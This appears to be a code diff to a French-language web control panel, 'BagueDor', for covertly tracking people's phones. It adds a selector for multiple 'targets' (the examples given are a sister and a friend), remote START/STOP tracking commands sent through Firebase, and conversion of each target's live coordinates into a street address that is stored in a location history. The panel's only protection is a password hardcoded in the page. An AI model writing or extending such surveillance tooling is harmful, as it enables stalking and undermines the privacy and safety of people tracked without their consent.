@@ -10,6 +10,10 @@
     header { padding: 20px; text-align: center; border-bottom: 2px solid #FF4D00; }
     h1 { color: #FF4D00; font-size: 22px; letter-spacing: 2px; }
     h1 span { color: #fff; }
+    #device-selector { padding: 15px; text-align: center; background: #111; border-bottom: 1px solid #222; }
+    #device-selector label { color: #aaa; font-size: 13px; margin-right: 10px; }
+    #device-select { background: #222; color: #FF4D00; border: 1px solid #FF4D00; padding: 8px 15px; border-radius: 6px; font-family: monospace; font-size: 14px; }
+    #btn-add { background: none; border: 1px solid #444; color: #aaa; padding: 8px 12px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-left: 10px; cursor: pointer; }
     #controls { display: flex; justify-content: center; gap: 15px; padding: 15px; }
     button { padding: 12px 28px; border: none; border-radius: 8px; font-size: 15px; font-family: monospace; cursor: pointer; font-weight: bold; transition: opacity 0.2s; }
     button:active { opacity: 0.7; }
@@ -17,6 +21,8 @@
     #btn-stop { background: #222; color: #aaa; border: 1px solid #333; }
     #status { text-align: center; font-size: 13px; color: #FF4D00; padding-bottom: 8px; min-height: 20px; }
     #info { padding: 10px 15px; text-align: center; font-size: 13px; color: #aaa; background: #111; border-bottom: 1px solid #222; }
+    #adresse { padding: 8px 15px; text-align: center; font-size: 13px; color: #fff; background: #1a1a1a; border-bottom: 1px solid #222; }
+    #adresse span { color: #FF4D00; }
     #map { width: 100%; height: 45vh; }
     #historique { padding: 15px; }
     #historique h2 { color: #FF4D00; font-size: 14px; margin-bottom: 10px; letter-spacing: 1px; }
@@ -26,12 +32,22 @@
 </head>
 <body>
   <header><h1>🔥 BAGUE<span>DOR</span></h1></header>
+
+  <div id="device-selector">
+    <label>🎯 Cible :</label>
+    <select id="device-select" onchange="switchDevice()">
+      <option value="might">might</option>
+    </select>
+    <button id="btn-add" onclick="addDevice()">+ Ajouter</button>
+  </div>
+
   <div id="controls">
     <button id="btn-start" onclick="sendCommand('start')">▶ START</button>
     <button id="btn-stop" onclick="sendCommand('stop')">■ STOP</button>
   </div>
   <div id="status">En attente...</div>
   <div id="info">Chargement...</div>
+  <div id="adresse">🏠 <span>Localisation en cours...</span></div>
   <div id="map"></div>
   <div id="historique">
     <h2>📜 HISTORIQUE</h2>
@@ -43,6 +59,8 @@
     const PASSWORD = "baguedor2026";
     let lastTimestamp = null;
     let history = [];
+    let currentDevice = "might";
+    let devices = JSON.parse(localStorage.getItem("devices") || '["might"]');
 
     function checkAuth() {
       const input = prompt("🔐 Mot de passe BagueDor :");
@@ -53,19 +71,60 @@
       return true;
     }
 
+    function renderDevices() {
+      const sel = document.getElementById("device-select");
+      sel.innerHTML = devices.map(d =>
+        `<option value="${d}" ${d === currentDevice ? "selected" : ""}>${d}</option>`
+      ).join("");
+    }
+
+    function addDevice() {
+      const name = prompt("Nom de la cible (ex: soeur, pote) :");
+      if (name && !devices.includes(name)) {
+        devices.push(name);
+        localStorage.setItem("devices", JSON.stringify(devices));
+        renderDevices();
+      }
+    }
+
+    function switchDevice() {
+      currentDevice = document.getElementById("device-select").value;
+      lastTimestamp = null;
+      history = [];
+      document.getElementById("entries").innerHTML = "";
+      document.getElementById("status").innerText = "En attente...";
+      loadPosition();
+    }
+
+    async function getAddress(lat, lng) {
+      try {
+        const res = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
+          { headers: { "User-Agent": "BagueDor/1.0" } }
+        );
+        const data = await res.json();
+        return data.display_name || "Adresse inconnue";
+      } catch {
+        return "Adresse inconnue";
+      }
+    }
+
     async function sendCommand(cmd) {
-      await fetch(`${FIREBASE_URL}/command.json`, {
+      await fetch(`${FIREBASE_URL}/devices/${currentDevice}/command.json`, {
         method: "PUT",
         body: JSON.stringify(cmd)
       });
       document.getElementById("status").innerText =
-        cmd === "start" ? "✅ START envoyé — tracking actif" : "🛑 STOP envoyé — tracking arrêté";
+        cmd === "start" ? `✅ START envoyé → ${currentDevice}` : `🛑 STOP envoyé → ${currentDevice}`;
     }
 
     async function loadPosition() {
-      const res = await fetch(`${FIREBASE_URL}/location.json`);
+      const res = await fetch(`${FIREBASE_URL}/devices/${currentDevice}/location.json`);
       const data = await res.json();
-      if (!data) return;
+      if (!data) {
+        document.getElementById("info").innerText = "Aucune position disponible";
+        return;
+      }
 
       const lat = data.latitude;
       const lng = data.longitude;
@@ -74,6 +133,9 @@
 
       document.getElementById("info").innerHTML =
         `📍 <b style="color:#FF4D00">${lat.toFixed(6)}</b>, <b style="color:#FF4D00">${lng.toFixed(6)}</b> &nbsp;|&nbsp; ⏱ ${time}`;
+
+      const adresse = await getAddress(lat, lng);
+      document.getElementById("adresse").innerHTML = `🏠 <span>${adresse}</span>`;
 
       const mapUrl = `https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed`;
       document.getElementById("map").innerHTML =
@@ -86,7 +148,7 @@
       lastTimestamp = ts;
 
       if (!history.length || history[0].ts !== ts) {
-        history.unshift({ lat, lng, time, ts });
+        history.unshift({ lat, lng, time, ts, adresse });
         if (history.length > 5) history.pop();
         renderHistory();
       }
@@ -95,9 +157,11 @@
     function renderHistory() {
       const el = document.getElementById("entries");
       el.innerHTML = history.map((h, i) =>
-        `<div class="entry">${i === 0 ? "🔴" : "⚪"} <span>${h.lat.toFixed(5)}, ${h.lng.toFixed(5)}</span><br>${h.time}</div>`
+        `<div class="entry">${i === 0 ? "🔴" : "⚪"} <span>${h.lat.toFixed(5)}, ${h.lng.toFixed(5)}</span><br>${h.adresse}<br>${h.time}</div>`
       ).join("");
     }
+
+    renderDevices();
 
     if (checkAuth()) {
       loadPosition();
